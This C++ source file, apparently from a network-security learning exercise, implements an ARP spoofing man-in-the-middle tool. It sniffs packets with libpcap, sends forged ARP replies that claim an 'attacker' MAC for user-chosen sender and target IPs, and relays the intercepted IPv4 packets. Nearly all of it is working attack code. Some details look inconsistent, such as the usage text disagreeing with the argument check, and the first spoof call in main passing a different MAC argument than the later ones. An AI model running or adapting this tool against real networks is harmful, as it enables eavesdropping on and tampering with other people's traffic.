#include <thread>
#include <vector>
#include <iostream>
#include <sstream>
#include <pcap.h>
#include "utils.h"
#include "protocoltype.h"
#include "init.h"
#include <boost/algorithm/string.hpp>
#include <mutex>
#include <typeinfo>
#include <map>

#define MTU 1500




void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
std::map<std::string,std::string> ip_to_mac;
std::string attackerIp;
std::string attackerMac;

// Observer Interface
class Observer {
public:
    virtual void onArpBroadcastDetected(std::string sI,std::string tI,const char* dev,std::string sM, std::string mM) = 0;
    virtual void onIPv4PacketReceived(const u_char* packet,int packetsize,const char* dev,std::string mM,std::string tM) = 0;
};
class ArpSpoofingStrategy {
public:
    virtual void execute() = 0;
};

class RelayStrategy : public ArpSpoofingStrategy {
private:
    const u_char* p;
    int packetsize;
    const char* dev;
    std::string mM;
    std::string tM;
public:
    RelayStrategy(const u_char* pkt,int pks,const char* DEV,std::string mm,std::string tm) : p(pkt), packetsize(pks), dev(DEV),mM(mm), tM(tm) {}
    
    void execute() override {
        relayPacket(p,packetsize,dev,mM,tM); 
    }
};

class SpoofingStrategy : public ArpSpoofingStrategy {
private:
    std::string sI;
    std::string tI;
    const char* dev;
    std::string sM;
    std::string mM;
public:
    SpoofingStrategy(std::string sdr,std::string trg,const char* DEV,std::string SM,std::string MM) : sI(sdr), tI(trg), dev(DEV), sM(SM), mM(MM) {}
    void execute() override {
        if(!sendArpSpoof(sI,tI,dev,sM,mM)){
            printf("send_error!\n\n");
        }; 
    }
};

class ArpPacketHandler : public Observer { //
private:
    ArpSpoofingStrategy* strategy=nullptr;
public:
    ArpPacketHandler() {}

    void onArpBroadcastDetected(std::string sI,std::string tI,const char* dev,std::string sM,std::string mM) override {
        if(dynamic_cast<SpoofingStrategy*>(strategy) == nullptr) {
            setStrategy(new SpoofingStrategy(sI, tI, dev, sM, mM));
        }
        strategy->execute();
    }

    void onIPv4PacketReceived(const u_char* pkt,int packetsize, const char* dev,std::string mM,std::string tM) override {
        if(dynamic_cast<RelayStrategy*>(strategy) == nullptr) {
            setStrategy(new RelayStrategy(pkt,packetsize, dev,mM, tM));
        }
        strategy->execute();
    }

    void setStrategy(ArpSpoofingStrategy* newStrategy) {
        if (strategy) {
            delete strategy;  // 기존 전략 삭제
        }
        strategy = newStrategy;
    }

    ~ArpPacketHandler() {
        if (strategy) {
            delete strategy;  // 메모리 누수 방지
        }
    }
};

class ArpMonitor {
private:
    std::mutex mtx;
    std::vector<std::pair<std::string, std::string>> ipPairs;
    std::vector<std::thread> threads;
    Observer* observer= nullptr;

public:
    ArpMonitor(Observer* obs) : observer(obs) {}  // Observer를 생성자에서 초기화

    void addIpPair(const std::string& sender, const std::string& target) {
        ipPairs.push_back({sender, target});
    }

    void startMonitoring(const char* dev) {
        monitorIpPair(dev,ipPairs);
    }

private:
    void monitorIpPair(const char* dev, std::vector<std::pair<std::string,std::string>> ipPairs) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle;

        handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr) {
            std::cerr << "Could not open device: " << errbuf << std::endl;
            return;
        }

        

        while (true) {
            struct pcap_pkthdr *header;
            const u_char *packet;

            int res = pcap_next_ex(handle, &header,&packet);
            if (res == 0) {
                continue;
            }

            // 패킷을 분석하여 ARP나 IPv4 패킷인지 확인
            int protocolType=checkType(packet);
            
/*             if(protocolType==2){
                printf(" checkSend(pac) is %s\n sender is %s\n\n\n",checkSend(packet).c_str(),sender.c_str());
            }

            printf("checksend is %s, sender is %s\n",checkSend(packet).c_str(),sender.c_str());
            printf("checkTarget is %s, target is %s\n",checkTarget(packet).c_str(),target.c_str());
            printf("checksMac is %s, ip_to_mac[%s] %s\n",checksMac(packet).c_str(),checksMac(packet).c_str(),ip_to_mac[sender].c_str());
            printf("checkdMac is %s, attackermac is %s\n",checkdMac(packet).c_str(),attackerMac.c_str()); */

            for(int i=0;i<ipPairs.size();i++){
                const u_char* pactmp= packet;
                if (protocolType==1&&(isBroadcast(packet)||isUnicast(packet,ipPairs[i].first,attackerIp,ip_to_mac))) { //arp
                    printf("arp broadcast is in\n\n");
                    observer->onArpBroadcastDetected(ipPairs[i].first,ipPairs[i].second,dev,ip_to_mac[ipPairs[i].first],ip_to_mac[attackerIp]);
                    break;
                    // packet의 sMac과 ip_to_mac의 sender[i]와 packet의 dmac과 attackermac이 같다면, 그 sender[i]를 보냄.
                } 
                else if (protocolType==2&&checksMac(packet)==ip_to_mac[ipPairs[i].first]&&checkdMac(packet)==attackerMac) { //ipv4
                    printf("sender ip is detected\n\n");
                    if(header->caplen <= MTU){
                        printf("header.len? : %d\n\n",header->caplen);
                        //ip_to_mac[target[i]]를 넣음.
                        observer->onIPv4PacketReceived(packet,int(header->caplen),dev,attackerMac,ip_to_mac[ipPairs[i].second]);
                        break;
                    }
                    else{
                        printf("its jumbo!!\n\n");
                    }
                }     
            }
        }
        pcap_close(handle);
    }
};
int main(int argc,char* argv[]) {
    if(argc!=2){
        usage();
        return -1;
    }

    std::cout << "Input pairs of sender's IP and target's IP you want in each line separated by a space. If you want to end, input 'N'\n";
    
    std::vector<std::pair<std::string, std::string>> ipPairs;
    std::string line, sender, target;

    while (true) {
        std::cout << "Enter sender's IP and target's IP: \n";
        std::getline(std::cin, line);
        std::istringstream iss(line);

        iss >> sender >> target;

        if (sender == "N" || sender == "n") {
            break;
        }

        if (!isValidIP(sender) || !isValidIP(target)) {
            std::cout << "Invalid IP format! Please input again.\n";
            continue;
        }

        ipPairs.push_back({sender, target});
    }

    std::cout << "\nInput ended.\n\n";

    for (const auto& pair : ipPairs) {
        std::cout << "Sender: " << pair.first << ", Target: " << pair.second << std::endl;
    }
    const char* dev = argv[1];

    ArpPacketHandler handler;
    ArpMonitor monitor(&handler);

    std::string temp=getMyMac(dev);  
    boost::algorithm::to_lower(temp);
    attackerMac=temp;
    attackerIp=getMyIp(dev);

    ip_to_mac[attackerIp]=attackerMac;
    for (auto& pair : ipPairs) {
        monitor.addIpPair(pair.first, pair.second);


        std::string tempMac1 = getSenderMac(pair.first, dev, attackerMac);
        boost::algorithm::to_lower(tempMac1);
        ip_to_mac[pair.first] = tempMac1;

        std::string tempMac2 = getSenderMac(pair.second, dev, attackerMac);
        boost::algorithm::to_lower(tempMac2);
        ip_to_mac[pair.second] = tempMac2;

        sendArpSpoof(pair.first,pair.second,dev,ip_to_mac[pair.first],ip_to_mac[pair.second]);
        printf("ip_to_mac[%s] : %s \n\n",pair.first.c_str(),ip_to_mac[pair.first].c_str());
    }

    // Initial setup
    
    monitor.startMonitoring(dev);
    
    // Simulate ARP broadcast detection
/*     handler.onArpBroadcastDetected();

    // Change strategy on the fly
    handler.setStrategy(&spoofing);
    handler.onArpBroadcastDetected(); */
    return 0;
}
